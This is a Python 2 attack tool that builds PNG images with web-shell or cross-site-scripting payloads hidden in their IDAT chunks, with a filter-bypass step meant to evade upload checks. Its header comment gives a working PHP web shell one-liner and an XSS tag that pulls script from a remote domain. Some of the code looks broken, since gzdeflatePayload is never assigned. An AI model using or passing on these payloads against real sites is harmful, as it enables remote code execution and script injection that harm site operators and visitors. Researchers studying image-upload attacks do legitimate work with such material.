#!/usr/bin/python
'''
Author: Hunter Gregal
Based off of code and concepts:
	Adam Logue -- https://www.adamlogue.com/revisiting-xss-payloads-in-png-idat-chunks
	IDontPlayDarts -- https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks
	fin1te -- https://whitton.io/articles/xss-on-facebook-via-png-content-types
	Vavkamil -- https://github.com/vavkamil/PNG-IDAT-chunks
Payloads:
	WebShell: <?=$_GET[0]($_POST[1]);?>
	XSS:	Varies alot. Easier with short remote include -- aka <SCRIPT src=//LOG.BZ><script>
'''
from coreFunctions import *
import argparse

#args
parser = argparse.ArgumentParser(description="Tool to generate PNG-IDAT Payloads.")
parser.add_argument('-r', '--remote-domain', dest='remoteDomain', help='Remote domain to retrieve payload from (shorter the better: ex. xx.xxx)', required=True, type=str)
parser.add_argument('-o', '--output-file', dest='outputImage', help='Output payload to PNG file', required=True, type=str)
args = parser.parse_args()

if __name__ == '__main__':
	#if PHP webshell do it:
	#else assume xss method
	
	#init args	
	remoteDomain = (args.remoteDomain).upper()
	outputImage = args.outputImage
	prefix,tld = remoteDomainParse(remoteDomain)

	#If Domain larger than 3 chars
	if len(prefix) > 3:
		print "Domains larger than 3 chars not supported yet!"
	#Check possible bruteforce methods
	else:
		method = calcBruteMethod(remoteDomain, prefix, tld)
	#If failed, quit
	if not gzdeflatePayload:
		print "[+] Payload Failed to Generate...exiting"
		sys.exit(0)
	#Generate filter-bypass
	payload = filterBypass(gzdeflatePayload)
	#Create Payload PNG
	generateFinalPayload(payload, outputImage)
